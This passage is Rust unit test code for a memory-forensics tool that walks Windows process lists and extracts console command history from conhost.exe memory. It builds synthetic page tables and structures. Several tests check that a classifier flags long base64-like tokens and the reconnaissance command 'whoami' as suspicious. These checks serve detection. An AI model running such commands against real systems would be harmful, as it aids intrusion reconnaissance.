        let token = format!("{}+/", "A".repeat(80));
        assert!(classify_console_command(&token));
    }

    /// Token with '=' padding characters is base64-like when >80 chars.
    #[test]
    fn classify_base64_with_equals_suspicious() {
        let token = format!("{}==", "A".repeat(80));
        assert!(classify_console_command(&token));
    }

    // ---------------------------------------------------------------
    // walk_consoles: process loop body coverage
    // ---------------------------------------------------------------

    /// walk_consoles: "conhost.exe" process with peb_addr=0 → process is skipped.
    /// Exercises the cr3==0||peb_addr==0 guard.
    #[test]
    fn walk_consoles_conhost_no_peb_skipped() {
        const PS_VADDR:   u64 = 0xFFFF_8000_0019_0000;
        const PS_PADDR:   u64 = 0x0019_0000;
        const EPROC_VADDR:u64 = 0xFFFF_8000_0018_0000;
        const EPROC_PADDR:u64 = 0x0018_0000;
        // Minimal ISF for process walk
        let isf = IsfBuilder::new()
            .add_struct("_LIST_ENTRY", 16)
            .add_field("_LIST_ENTRY", "Flink", 0, "pointer")
            .add_struct("_EPROCESS", 512)
            .add_field("_EPROCESS", "ActiveProcessLinks", 0, "_LIST_ENTRY")
            .add_field("_EPROCESS", "UniqueProcessId", 0x10, "unsigned long long")
            .add_field("_EPROCESS", "InheritedFromUniqueProcessId", 0x18, "unsigned long long")
            .add_field("_EPROCESS", "ImageFileName", 0x20, "array") // 15-char name
            .add_field("_EPROCESS", "CreateTime", 0x30, "unsigned long long")
            .add_field("_EPROCESS", "ExitTime", 0x38, "unsigned long long")
            .add_field("_EPROCESS", "Peb", 0x40, "pointer")
            .add_field("_EPROCESS", "Pcb", 0, "_KPROCESS")
            .add_struct("_KPROCESS", 64)
            .add_field("_KPROCESS", "DirectoryTableBase", 0x28, "unsigned long long")
            .add_struct("_PEB", 64)
            .add_symbol("PsActiveProcessHead", PS_VADDR)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();

        let link_offset = 0u64; // ActiveProcessLinks at 0

        // ps_head page: Flink → eproc's ActiveProcessLinks
        let eproc_links_vaddr = EPROC_VADDR + link_offset;
        let mut ps_page = vec![0u8; 4096];
        ps_page[0..8].copy_from_slice(&eproc_links_vaddr.to_le_bytes());

        // eproc page: ActiveProcessLinks.Flink = PS_VADDR (end), peb=0
        let mut eproc_page = vec![0u8; 4096];
        eproc_page[0..8].copy_from_slice(&PS_VADDR.to_le_bytes()); // Flink = PS_HEAD (terminates)
        // ImageFileName at 0x20 = "conhost.exe"
        let name = b"conhost.exe\0\0\0\0";
        eproc_page[0x20..0x20 + name.len()].copy_from_slice(name);
        // Peb at 0x40 = 0 (no PEB)
        // DirectoryTableBase at 0x28 = 0x1000 (some CR3)
        eproc_page[0x28..0x30].copy_from_slice(&0x1000u64.to_le_bytes());

        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(PS_VADDR, PS_PADDR, flags::WRITABLE)
            .write_phys(PS_PADDR, &ps_page)
            .map_4k(EPROC_VADDR, EPROC_PADDR, flags::WRITABLE)
            .write_phys(EPROC_PADDR, &eproc_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        // conhost.exe with peb=0 → skipped → empty
        let result = walk_consoles(&reader).unwrap();
        assert!(result.is_empty());
    }

    // ---------------------------------------------------------------
    // scan_for_console_info: exercise the self-consistency check
    // ---------------------------------------------------------------

    /// scan_for_console_info finds a candidate when flink→blink == head_addr.
    #[test]
    fn scan_for_console_info_finds_candidate_with_valid_list() {
        const BASE_VADDR: u64 = 0x0000_7FFF_0015_0000;
        const BASE_PADDR: u64 = 0x0015_0000;

        let hist_list_off: u64 = 0x40;
        // candidate at offset 0:
        //   head_addr = BASE_VADDR + 0 + 0x40 = BASE_VADDR + 0x40
        //   flink at +0x40 = BASE_VADDR + 0x300 (user-mode plausible)
        //   blink at +0x48 = flink (non-null, plausible)
        //   flink+8 (blink of flink entry) = head_addr
        let head_addr = BASE_VADDR + hist_list_off;
        let flink = BASE_VADDR + 0x300;

        let mut page = vec![0u8; 4096];
        // HistoryList.Flink at 0x40
        page[0x40..0x48].copy_from_slice(&flink.to_le_bytes());
        // HistoryList.Blink at 0x48
        page[0x48..0x50].copy_from_slice(&flink.to_le_bytes());
        // flink entry at 0x300: Flink at +0, Blink at +8 = head_addr
        page[0x300..0x308].copy_from_slice(&flink.to_le_bytes()); // Flink of flink-entry
        page[0x308..0x310].copy_from_slice(&head_addr.to_le_bytes()); // Blink = head_addr ✓

        let isf = IsfBuilder::new().build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(BASE_VADDR, BASE_PADDR, flags::WRITABLE)
            .write_phys(BASE_PADDR, &page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        let candidates = scan_for_console_info(&reader, BASE_VADDR, hist_list_off);
        assert!(!candidates.is_empty());
        assert_eq!(candidates[0], BASE_VADDR);
    }

    // ---------------------------------------------------------------
    // extract_console_commands: full command extraction path
    // ---------------------------------------------------------------

    /// extract_console_commands: full path through scan → history → command.
    #[test]
    fn extract_console_commands_full_path_finds_suspicious_command() {
        // Everything in one page at HEAP_VADDR
        const PEB_VADDR:  u64 = 0x0000_7FFF_0012_0000;
        const PEB_PADDR:  u64 = 0x0012_0000;
        const HEAP_VADDR: u64 = 0x0000_7FFF_0011_0000;
        const HEAP_PADDR: u64 = 0x0011_0000;
        // Extra pages for bucket and cmd entry
        const CMD_VADDR:  u64 = 0x0000_7FFF_0010_0000;
        const CMD_PADDR:  u64 = 0x0010_0000;

        let hist_list_off: u64 = 0x40;
        // candidate at offset 0 in HEAP page:
        //   head_addr = HEAP_VADDR + 0x40
        //   hist_entry_addr = HEAP_VADDR + 0x300
        let head_addr = HEAP_VADDR + hist_list_off;
        let hist_entry_addr = HEAP_VADDR + 0x300;

        // For walk_history_list:
        //   list_head = head_addr
        //   first_flink = hist_entry_addr (stored at head_addr)
        //   hist_entry Flink (at hist_entry_addr) = head_addr (terminates after 1 entry)
        //   list_entry_off = 0 → struct_addr = hist_entry_addr

        // For scan_for_console_info self-consistency:
        //   flink at +0x40 = hist_entry_addr
        //   blink at +0x48 = hist_entry_addr
        //   flink_blink = value at hist_entry_addr + 8 must == head_addr

        // hist_entry layout (at heap page offset 0x300):
        //   +0: Flink = head_addr (terminates)
        //   +8: Blink = head_addr (self-consistency check)
        //   +0x10: Application (_UNICODE_STRING): Length=14, MaxLength=14, Buffer=app_buf_vaddr
        //   +0x20: CommandCount = 1
        //   +0x28: CommandBucket = bucket_ptr

        // Bucket and cmd entry in CMD page:
        //   bucket[0] (at CMD_VADDR) = cmd_entry_vaddr (= CMD_VADDR + 0x100)
        //   cmd_entry at CMD_VADDR+0x100:
        //     +0x00: CommandLength(u16) = whoami_utf16_bytes
        //     +0x08: Command = UTF-16LE "whoami"
        //   app name at CMD_VADDR+0x200: UTF-16LE "cmd.exe"

        let app_buf_vaddr = CMD_VADDR + 0x200;
        let bucket_ptr = CMD_VADDR;
        let cmd_entry_vaddr = CMD_VADDR + 0x100;

        let whoami = "whoami";
        let whoami_utf16: Vec<u8> = whoami.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        let cmdexe = "cmd.exe";
        let cmdexe_utf16: Vec<u8> = cmdexe.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();

        let isf = IsfBuilder::new()
            .add_struct("_PEB", 64)
            .add_field("_PEB", "ProcessHeap", 0x30, "pointer")
            .add_struct("_UNICODE_STRING", 16)
            .add_field("_UNICODE_STRING", "Length", 0, "unsigned short")
            .add_field("_UNICODE_STRING", "MaximumLength", 2, "unsigned short")
            .add_field("_UNICODE_STRING", "Buffer", 8, "pointer")
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();

        // PEB page: ProcessHeap at 0x30 = HEAP_VADDR
        let mut peb_page = vec![0u8; 4096];
        peb_page[0x30..0x38].copy_from_slice(&HEAP_VADDR.to_le_bytes());

        // Heap page
        let mut heap_page = vec![0u8; 4096];
        // scan candidate at offset 0: flink = hist_entry_addr, blink = hist_entry_addr
        heap_page[0x40..0x48].copy_from_slice(&hist_entry_addr.to_le_bytes());
        heap_page[0x48..0x50].copy_from_slice(&hist_entry_addr.to_le_bytes());
        // hist_entry at 0x300:
        heap_page[0x300..0x308].copy_from_slice(&head_addr.to_le_bytes()); // Flink = head_addr
        heap_page[0x308..0x310].copy_from_slice(&head_addr.to_le_bytes()); // Blink = head_addr (consistency)
        // Application _UNICODE_STRING at 0x310 (= 0x300 + 0x10)
        let app_len = cmdexe_utf16.len() as u16;
        heap_page[0x310..0x312].copy_from_slice(&app_len.to_le_bytes()); // Length
        heap_page[0x312..0x314].copy_from_slice(&app_len.to_le_bytes()); // MaxLength
        heap_page[0x318..0x320].copy_from_slice(&app_buf_vaddr.to_le_bytes()); // Buffer
        // CommandCount at 0x320 (= 0x300 + 0x20)
        heap_page[0x320..0x324].copy_from_slice(&1u32.to_le_bytes());
        // CommandBucket at 0x328 (= 0x300 + 0x28)
        heap_page[0x328..0x330].copy_from_slice(&bucket_ptr.to_le_bytes());

        // CMD page: bucket[0] = cmd_entry_vaddr
        let mut cmd_page = vec![0u8; 4096];
        cmd_page[0..8].copy_from_slice(&cmd_entry_vaddr.to_le_bytes());
        // cmd_entry at 0x100: CommandLength at +0, Command at +0x08
        let whoami_len = whoami_utf16.len() as u16;
        cmd_page[0x100..0x102].copy_from_slice(&whoami_len.to_le_bytes());
        cmd_page[0x108..0x108 + whoami_utf16.len()].copy_from_slice(&whoami_utf16);
        // app name at 0x200
        cmd_page[0x200..0x200 + cmdexe_utf16.len()].copy_from_slice(&cmdexe_utf16);

        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(PEB_VADDR, PEB_PADDR, flags::WRITABLE)
            .write_phys(PEB_PADDR, &peb_page)
            .map_4k(HEAP_VADDR, HEAP_PADDR, flags::WRITABLE)
            .write_phys(HEAP_PADDR, &heap_page)
            .map_4k(CMD_VADDR, CMD_PADDR, flags::WRITABLE)
            .write_phys(CMD_PADDR, &cmd_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        let result = extract_console_commands(&reader, 1234, "conhost.exe", PEB_VADDR).unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].command, "whoami");
        assert!(result[0].is_suspicious);
        assert_eq!(result[0].application, "cmd.exe");
    }

    /// walk_consoles: "conhost.exe" with non-zero peb and cr3, but ProcessHeap
    /// is zero (unmapped PEB) → extract_console_commands returns empty.
    #[test]
    fn walk_consoles_conhost_valid_peb_no_heap() {
        const PS_VADDR:   u64 = 0xFFFF_8000_000F_0000;
        const PS_PADDR:   u64 = 0x000F_0000;
        const EPROC_VADDR:u64 = 0xFFFF_8000_000E_0000;
        const EPROC_PADDR:u64 = 0x000E_0000;
        const PEB_VADDR:  u64 = 0x0000_7FFF_000D_0000;
        const PEB_PADDR:  u64 = 0x000D_0000;

        let isf = IsfBuilder::new()
            .add_struct("_LIST_ENTRY", 16)
            .add_field("_LIST_ENTRY", "Flink", 0, "pointer")
            .add_struct("_EPROCESS", 512)
            .add_field("_EPROCESS", "ActiveProcessLinks", 0, "_LIST_ENTRY")
            .add_field("_EPROCESS", "UniqueProcessId", 0x10, "unsigned long long")
            .add_field("_EPROCESS", "InheritedFromUniqueProcessId", 0x18, "unsigned long long")
            .add_field("_EPROCESS", "ImageFileName", 0x20, "array")
            .add_field("_EPROCESS", "CreateTime", 0x30, "unsigned long long")
            .add_field("_EPROCESS", "ExitTime", 0x38, "unsigned long long")
            .add_field("_EPROCESS", "Peb", 0x40, "pointer")
            .add_field("_EPROCESS", "Pcb", 0, "_KPROCESS")
            .add_struct("_KPROCESS", 64)
            .add_field("_KPROCESS", "DirectoryTableBase", 0x28, "unsigned long long")
            .add_struct("_PEB", 64)
            .add_field("_PEB", "ProcessHeap", 0x30, "pointer")
            .add_symbol("PsActiveProcessHead", PS_VADDR)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();

        let eproc_links_vaddr = EPROC_VADDR;
        let mut ps_page = vec![0u8; 4096];
        ps_page[0..8].copy_from_slice(&eproc_links_vaddr.to_le_bytes());

        let mut eproc_page = vec![0u8; 4096];
        eproc_page[0..8].copy_from_slice(&PS_VADDR.to_le_bytes()); // Flink terminates
        let name = b"conhost.exe\0\0\0\0";
        eproc_page[0x20..0x20 + name.len()].copy_from_slice(name);
        eproc_page[0x28..0x30].copy_from_slice(&0x2000u64.to_le_bytes()); // cr3
        eproc_page[0x40..0x48].copy_from_slice(&PEB_VADDR.to_le_bytes()); // peb

        // PEB page: ProcessHeap = 0
        let peb_page = vec![0u8; 4096];

        let (cr3, mem) = PageTableBuilder::new()
            .map_4k(PS_VADDR, PS_PADDR, flags::WRITABLE)
            .write_phys(PS_PADDR, &ps_page)
            .map_4k(EPROC_VADDR, EPROC_PADDR, flags::WRITABLE)
            .write_phys(EPROC_PADDR, &eproc_page)
            .map_4k(PEB_VADDR, PEB_PADDR, flags::WRITABLE)
            .write_phys(PEB_PADDR, &peb_page)
            .build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));
        let result = walk_consoles(&reader).unwrap();
        assert!(result.is_empty());
    }
}
